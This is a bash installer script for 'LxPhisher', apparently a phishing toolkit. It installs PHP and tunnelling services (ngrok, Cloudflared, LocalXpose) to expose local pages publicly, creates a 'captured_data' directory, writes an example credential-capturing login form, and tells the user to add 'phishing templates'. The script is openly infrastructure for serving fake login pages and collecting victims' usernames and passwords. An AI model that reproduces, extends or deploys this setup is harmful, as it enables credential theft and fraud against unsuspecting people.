#!/bin/bash

# LxPhisher Complete Auto-Installer for Linux and macOS
# Installs all dependencies, PHP, and tunnel services

# Color codes
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
CYAN='\033[0;96m'
NC='\033[0m'

# Configuration
TUNNELS_DIR=".tunnels"
TEMP_DIR="/tmp/lxphisher_install"

# Detect OS
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        echo "macos"
    else
        echo "unknown"
    fi
}

# Function to display status messages
status_msg() {
    echo -e "${BLUE}[*]${NC} $1"
}

success_msg() {
    echo -e "${GREEN}[+]${NC} $1"
}

error_msg() {
    echo -e "${RED}[!]${NC} $1"
}

warning_msg() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Install package based on OS
install_package() {
    local package=$1
    local os=$(detect_os)
    
    case $os in
        "linux")
            if command_exists "apt-get"; then
                sudo apt-get update && sudo apt-get install -y "$package"
            elif command_exists "yum"; then
                sudo yum install -y "$package"
            elif command_exists "dnf"; then
                sudo dnf install -y "$package"
            elif command_exists "pacman"; then
                sudo pacman -S --noconfirm "$package"
            elif command_exists "zypper"; then
                sudo zypper install -y "$package"
            else
                error_msg "Cannot determine package manager for Linux"
                return 1
            fi
            ;;
        "macos")
            if command_exists "brew"; then
                brew install "$package"
            else
                error_msg "Homebrew not installed. Please install Homebrew first: /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
                return 1
            fi
            ;;
        *)
            error_msg "Unsupported operating system"
            return 1
            ;;
    esac
}

# Install PHP and required extensions
install_php() {
    status_msg "Installing PHP and extensions..."
    
    local os=$(detect_os)
    
    case $os in
        "linux")
            if command_exists "apt-get"; then
                sudo apt-get update
                sudo apt-get install -y php php-curl php-cli php-common
            elif command_exists "yum"; then
                sudo yum install -y php php-curl php-cli
            elif command_exists "dnf"; then
                sudo dnf install -y php php-curl php-cli
            elif command_exists "pacman"; then
                sudo pacman -S --noconfirm php php-curl
            fi
            ;;
        "macos")
            brew install php
            ;;
    esac
    
    if command_exists "php"; then
        success_msg "PHP installed successfully"
        php -v
    else
        error_msg "PHP installation failed"
        return 1
    fi
}

# Install required dependencies
install_dependencies() {
    status_msg "Installing required dependencies..."
    
    local dependencies=("curl" "wget" "unzip" "jq" "ssh")
    local missing_deps=()
    
    # Check which dependencies are missing
    for dep in "${dependencies[@]}"; do
        if ! command_exists "$dep"; then
            missing_deps+=("$dep")
        fi
    done
    
    if [ ${#missing_deps[@]} -eq 0 ]; then
        success_msg "All dependencies already installed"
        return 0
    fi
    
    # Install missing dependencies
    for dep in "${missing_deps[@]}"; do
        status_msg "Installing $dep..."
        install_package "$dep"
        
        if ! command_exists "$dep"; then
            error_msg "Failed to install $dep"
            return 1
        fi
    done
    
    success_msg "All dependencies installed successfully"
}

# Install Ngrok
install_ngrok() {
    status_msg "Installing Ngrok..."
    
    if command_exists "ngrok"; then
        success_msg "Ngrok is already installed"
        return 0
    fi
    
    local os=$(detect_os)
    local arch=$(uname -m)
    
    # Determine download URL based on OS and architecture
    case $os in
        "linux")
            if [[ "$arch" == "x86_64" ]]; then
                ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
            elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
                ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
            elif [[ "$arch" == "armv7l" ]]; then
                ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
            else
                error_msg "Unsupported architecture: $arch"
                return 1
            fi
            ;;
        "macos")
            if [[ "$arch" == "x86_64" ]]; then
                ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
            elif [[ "$arch" == "arm64" ]]; then
                ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip"
            else
                error_msg "Unsupported architecture: $arch"
                return 1
            fi
            ;;
        *)
            error_msg "Unsupported OS for Ngrok installation"
            return 1
            ;;
    esac
    
    # Download and install Ngrok
    mkdir -p "$TEMP_DIR"
    cd "$TEMP_DIR"
    
    if [[ "$ngrok_url" == *".tgz" ]]; then
        curl -sSL "$ngrok_url" -o ngrok.tgz
        tar -xzf ngrok.tgz
    else
        curl -sSL "$ngrok_url" -o ngrok.zip
        unzip -qq ngrok.zip
    fi
    
    # Move to local bin
    sudo mv ngrok /usr/local/bin/
    chmod +x /usr/local/bin/ngrok
    
    # Cleanup
    cd - > /dev/null
    rm -rf "$TEMP_DIR"
    
    if command_exists "ngrok"; then
        success_msg "Ngrok installed successfully"
        ngrok --version
    else
        error_msg "Ngrok installation failed"
        return 1
    fi
}

# Install Cloudflared
install_cloudflared() {
    status_msg "Installing Cloudflared..."
    
    mkdir -p "$TUNNELS_DIR"
    
    local arch=$(uname -m)
    local pkg=""
    
    # Determine package based on architecture
    case $arch in
        "x86_64") pkg="cloudflared-linux-amd64" ;;
        "i386"|"i686") pkg="cloudflared-linux-386" ;;
        "aarch64"|"arm64") pkg="cloudflared-linux-arm64" ;;
        "armv7l"|"armv6l") pkg="cloudflared-linux-arm" ;;
        *) error_msg "Unsupported architecture: $arch"; return 1 ;;
    esac
    
    # Download Cloudflared
    cd "$TUNNELS_DIR"
    curl -sSL "https://github.com/cloudflare/cloudflared/releases/latest/download/$pkg.tar.gz" -o cloudflared.tar.gz
    
    # Extract
    tar -zxf cloudflared.tar.gz
    mv cloudflared cloudflared-bin
    chmod +x cloudflared-bin
    rm -f cloudflared.tar.gz
    
    cd - > /dev/null
    
    if [ -f "$TUNNELS_DIR/cloudflared-bin" ]; then
        success_msg "Cloudflared installed successfully"
    else
        error_msg "Cloudflared installation failed"
        return 1
    fi
}

# Install LocalXpose
install_localxpose() {
    status_msg "Installing LocalXpose..."
    
    mkdir -p "$TUNNELS_DIR"
    
    local arch=$(uname -m)
    local pkg=""
    
    # Determine package based on architecture
    case $arch in
        "x86_64") pkg="loclx-linux-amd64.zip" ;;
        "aarch64"|"arm64") pkg="loclx-linux-arm64.zip" ;;
        "armv7l"|"armv6l") pkg="loclx-linux-arm.zip" ;;
        "i386"|"i686") pkg="loclx-linux-386.zip" ;;
        *) error_msg "Unsupported architecture: $arch"; return 1 ;;
    esac
    
    # Download LocalXpose
    cd "$TUNNELS_DIR"
    curl -sSL "https://api.localxpose.io/api/v2/downloads/$pkg" -o loclx.zip
    
    # Extract
    unzip -qq loclx.zip
    chmod +x loclx
    rm -f loclx.zip
    
    cd - > /dev/null
    
    if [ -f "$TUNNELS_DIR/loclx" ]; then
        success_msg "LocalXpose installed successfully"
    else
        error_msg "LocalXpose installation failed"
        return 1
    fi
}

# Setup directory structure
setup_directories() {
    status_msg "Setting up directory structure..."
    
    local directories=("templates" "servers" "captured_data" "auth" "$TUNNELS_DIR")
    
    for dir in "${directories[@]}"; do
        if [ ! -d "$dir" ]; then
            mkdir -p "$dir"
            success_msg "Created directory: $dir/"
        else
            status_msg "Directory already exists: $dir/"
        fi
    done
    
    # Create basic template structure example
    if [ ! -d "templates/example" ]; then
        mkdir -p "templates/example"
        cat > "templates/example/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Example Login</title>
</head>
<body>
    <h2>Login Page</h2>
    <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>
EOF
        status_msg "Created example template structure"
    fi
}

# Check installation
check_installation() {
    status_msg "Checking installation..."
    
    local success=true
    local requirements=("php" "curl" "wget" "unzip" "jq")
    
    echo -e "${CYAN}Required tools:${NC}"
    for req in "${requirements[@]}"; do
        if command_exists "$req"; then
            echo -e "  ✓ $req"
        else
            echo -e "  ✗ $req"
            success=false
        fi
    done
    
    echo -e "\n${CYAN}Tunnel services:${NC}"
    if command_exists "ngrok"; then
        echo -e "  ✓ Ngrok"
    else
        echo -e "  ✗ Ngrok"
    fi
    
    if [ -f "$TUNNELS_DIR/cloudflared-bin" ]; then
        echo -e "  ✓ Cloudflared"
    else
        echo -e "  ✗ Cloudflared"
    fi
    
    if [ -f "$TUNNELS_DIR/loclx" ]; then
        echo -e "  ✓ LocalXpose"
    else
        echo -e "  ✗ LocalXpose"
    fi
    
    echo -e "\n${CYAN}Directory structure:${NC}"
    local directories=("templates" "servers" "captured_data" "auth" "$TUNNELS_DIR")
    for dir in "${directories[@]}"; do
        if [ -d "$dir" ]; then
            echo -e "  ✓ $dir/"
        else
            echo -e "  ✗ $dir/"
            success=false
        fi
    done
    
    if [ "$success" = true ]; then
        success_msg "All requirements installed successfully!"
        echo -e "\n${GREEN}LxPhisher is ready to use!${NC}"
        echo -e "Run: ${CYAN}./lxphisher.sh${NC} to start"
    else
        warning_msg "Some components failed to install. Check above for errors."
    fi
}

# Main installation function
main_install() {
    echo -e "${PURPLE}"
    echo "=============================================="
    echo "      LxPhisher Complete Auto-Installer"
    echo "           for Linux and macOS"
    echo "=============================================="
    echo -e "${NC}"
    
    # Detect OS
    local os=$(detect_os)
    if [ "$os" = "unknown" ]; then
        error_msg "Unsupported operating system"
        exit 1
    fi
    status_msg "Detected OS: $os"
    
    # Check if we have sudo privileges
    if [ "$os" = "linux" ] && [ "$EUID" -ne 0 ]; then
        status_msg "Requesting sudo privileges for installation..."
        sudo -v
        if [ $? -ne 0 ]; then
            error_msg "Sudo access required for installation"
            exit 1
        fi
    fi
    
    # Install dependencies
    install_dependencies
    if [ $? -ne 0 ]; then
        error_msg "Failed to install dependencies"
        exit 1
    fi
    
    # Install PHP
    install_php
    if [ $? -ne 0 ]; then
        error_msg "Failed to install PHP"
        exit 1
    fi
    
    # Install Ngrok
    install_ngrok
    if [ $? -ne 0 ]; then
        warning_msg "Ngrok installation failed, but continuing with other tunnel services"
    fi
    
    # Install Cloudflared
    install_cloudflared
    if [ $? -ne 0 ]; then
        warning_msg "Cloudflared installation failed, but continuing with other tunnel services"
    fi
    
    # Install LocalXpose
    install_localxpose
    if [ $? -ne 0 ]; then
        warning_msg "LocalXpose installation failed"
    fi
    
    # Setup directory structure
    setup_directories
    
    # Final check
    echo -e "\n"
    check_installation
    
    # Cleanup
    rm -rf "$TEMP_DIR" 2>/dev/null
    
    echo -e "\n${GREEN}Installation completed!${NC}"
    echo -e "Next steps:"
    echo -e "1. Add your phishing templates to the ${CYAN}templates/${NC} directory"
    echo -e "2. Run ${CYAN}./lxphisher.sh${NC} to start"
    echo -e "3. For Ngrok, you may need to authenticate: ${CYAN}ngrok authtoken YOUR_TOKEN${NC}"
}

# Check if script is being sourced or directly executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Script is being executed directly
    main_install
fi